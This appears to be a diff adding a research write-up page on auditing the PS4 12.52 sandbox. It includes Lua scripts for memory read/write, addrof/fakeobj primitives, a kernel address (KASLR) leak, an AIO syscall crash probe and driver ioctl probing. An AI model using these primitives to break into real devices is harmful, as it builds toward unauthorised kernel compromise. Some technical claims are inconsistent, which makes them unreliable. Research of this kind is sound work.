@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS4 12.52 Sandbox Audit</title>
+    <style>
+        :root {
+            --bg: #0d1117;
+            --text: #c9d1d9;
+            --accent: #58a6ff;
+            --code-bg: #161b22;
+            --border: #30363d;
+            --success: #3fb950;
+            --danger: #f85149;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        h1, h2, h3 { color: #ffffff; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
+        h1 { font-size: 2.5em; border-bottom: none; margin-bottom: 0; }
+        h2 { margin-top: 40px; }
+        a { color: var(--accent); text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .status { display: inline-block; padding: 4px 8px; background: #d29922; color: #000; border-radius: 4px; font-weight: bold; font-size: 0.8em; margin-bottom: 20px; }
+        pre {
+            background-color: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 16px;
+            overflow-x: auto;
+            font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
+            font-size: 14px;
+        }
+        code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; background-color: rgba(110, 118, 129, 0.4); padding: 0.2em 0.4em; border-radius: 6px; font-size: 85%; }
+        pre code { background-color: transparent; padding: 0; border-radius: 0; font-size: 100%; }
+        .success { color: var(--success); }
+        .danger { color: var(--danger); }
+        .footer { margin-top: 60px; text-align: center; font-style: italic; color: #8b949e; border-top: 1px solid var(--border); padding-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>PS4 12.52 Sandbox Audit & Exploit Research</h1>
+        <div class="status">STATUS: ARCHIVED / RESEARCH PHASE</div>
+        
+        <p><strong>Firmware Target:</strong> PS4 12.52<br>
+        <strong>Environment:</strong> remote_lua_loader (Lua 5.1)<br>
+        <strong>Authors:</strong> He & Tulip 🌷</p>
+
+        <h2>📌 Overview</h2>
+        <p>This repository contains the complete documentation, scripts, and findings from an intensive research project targeting the PlayStation 4 firmware <strong>12.52</strong>. The goal was to discover a new kernel exploit from scratch using only the <code>remote_lua_loader</code> as an entry point, completely avoiding WebKit and BD-J.</p>
+        <p>While a full jailbreak (Kernel R/W -> GoldHEN) was not achieved due to missing public kernel offsets and primitives for this specific firmware, this repository serves as a comprehensive <strong>map of the sandbox</strong>. It documents exactly what works, what is patched, and what vectors are still theoretically viable for future researchers.</p>
+
+        <h2>🏆 Achievements (What Works)</h2>
+        <ul>
+            <li><strong>Complete Userland R/W:</strong> Using Lua 5.1 primitives (<code>memory.read_buffer</code>, <code>memory.write_buffer</code>).</li>
+            <li><strong>Object Manipulation:</strong> <code>addrof</code>, <code>fakeobj</code>, and <code>create_fake_cclosure</code> are fully functional.</li>
+            <li><strong>KASLR Bypass:</strong> Successfully leaked kernel pointers and mapped fixed bases (Kernel Leak: <code>0xffffffffb8fd86f0</code>).</li>
+            <li><strong>Sandbox Mapping:</strong> Fully documented the Event Flag family (Syscalls 538, 539, 544, 548, 638).</li>
+        </ul>
+
+        <h2>💀 Dead Ends (What is Patched)</h2>
+        <ul>
+            <li><strong>Event Flag UAF:</strong> Syscalls 544 and 548 do not write to the allocated object. Heap grooming is prevented by UMA.</li>
+            <li><strong>IPv6 NetControl:</strong> <code>setsockopt</code> with <code>IPV6_PKTOPTIONS</code>, <code>HOPOPTS</code>, <code>DSTOPTS</code>, and <code>RTHDR</code> return <code>EPERM</code> or <code>EINVAL</code>.</li>
+            <li><strong>Lua 5.3 CVEs:</strong> Public Lua CVEs are fully patched by Sony's custom implementation.</li>
+            <li><strong>Driver IOCTLs:</strong> <code>/dev/gc</code>, <code>/dev/dce</code>, and <code>/dev/dmem</code> return <code>-1</code> for all commands.</li>
+        </ul>
+
+        <h2>🔬 The Promising Vector: AIO Multi-Cancel (Syscall 601)</h2>
+        <p>We discovered a deterministic crash in <code>aio_submit</code> (Mode 3). Calling <code>601(3, ...)</code> immediately crashes the application (SIGSEGV in userland, <strong>not</strong> a kernel panic). This indicates a missing validation check in the kernel's AIO submission queue. The goal for future work is to control the structure passed to Mode 3 to trigger a Use-After-Free (UAF) and reclaim the freed slot with a controlled object.</p>
+
+        <h2>🛠️ The Code Vault</h2>
+        <p>Here are the exact scripts used during the audit.</p>
+
+        <h3>1. Environment Recon (01_recon.lua)</h3>
+        <pre><code>local buf = memory.alloc(0x100)
+memory.write_qword(buf, 0x4141414142424242)
+print(string.format("mem R/W: 0x%x", memory.read_qword(buf):tonumber()))
+local f = function() return 1 end
+print(string.format("addrof(fn): 0x%x", lua.addrof(f):tonumber()))
+print("create_fake_cclosure: " .. tostring(pcall(lua.create_fake_cclosure, uint64("0x400042"))))
+print("getpid: " .. fcall(dlsym(LIBKERNEL_HANDLE, "getpid"))():tonumber())
+print("getuid: " .. syscall.getuid():tonumber())
+print("in_sandbox: " .. syscall.is_in_sandbox():tonumber())</code></pre>
+
+        <h3>2. KASLR Leak (02_kaslr_leak.lua)</h3>
+        <pre><code>local h = sys(538)(lua.resolve_value(buf):tonumber(), 0, 0x20, 0, 0, 0):tonumber()
+memory.write_buffer(buf, string.rep(string.char(0xCC), 0x2000))
+local r = sys(638)(h, 0, lua.resolve_value(buf):tonumber(), 0x100, 0, 0):tonumber()
+local raw = memory.read_buffer(buf, 16)
+local b1, b2, b3, b4, b5, b6, b7, b8 = string.byte(raw, 1, 8)
+local hi = b8 * 0x1000000 + b7 * 0x10000 + b6 * 0x100 + b5
+local lo = b4 * 0x1000000 + b3 * 0x10000 + b2 * 0x100 + b1
+print(string.format("[+] KASLR Leak: 0x%08x%08x", hi, lo))</code></pre>
+
+        <h3>3. AIO Mode 3 Crash Investigation (04_aio_investigate.lua)</h3>
+        <pre><code>local function test(name, list_ptr, nent)
+    print("TEST: " .. name)
+    local ok, ret = pcall(S_601, 3, list_ptr, nent, 0, 0, 0)
+    if ok then
+        print("  resultado: " .. tostring(ret and ret:tonumber()))
+    else
+        print("  EXCEPCION: " .. tostring(ret))
+    end
+end
+-- Passing an array of aiocb pointers causes an unconditional SIGSEGV
+test("array de 1 aiocb", array_addr, 1)
+test("array todos NULL", array_addr, 4)</code></pre>
+
+        <h3>4. Driver IOCTL Check (05_driver_fuzzer.lua)</h3>
+        <pre><code>local candidates = { "/dev/gc", "/dev/dce", "/dev/dmem0" }
+local generic_ioctls = {
+    {name="FIONBIO",  cmd=0x8004667E},
+    {name="FIONREAD", cmd=0x4004667F},
+    {name="raw0", cmd=0},
+}
+for _, dev in ipairs(candidates) do
+    local fd = syscall.open(dev, 2, 420):tonumber()
+    if fd >= 0 then
+        for _, gi in ipairs(generic_ioctls) do
+            local rv = syscall.ioctl(fd, gi.cmd, gbuf_addr):tonumber()
+            if rv ~= -1 then print("Vulnerable: " .. dev) end
+        end
+    end
+end</code></pre>
+
+        <div class="footer">
+            "The room is dark again, but it's no longer empty. It has our map." <br> - Tulip 🌷
+        </div>
+    </div>
+</body>
+</html>
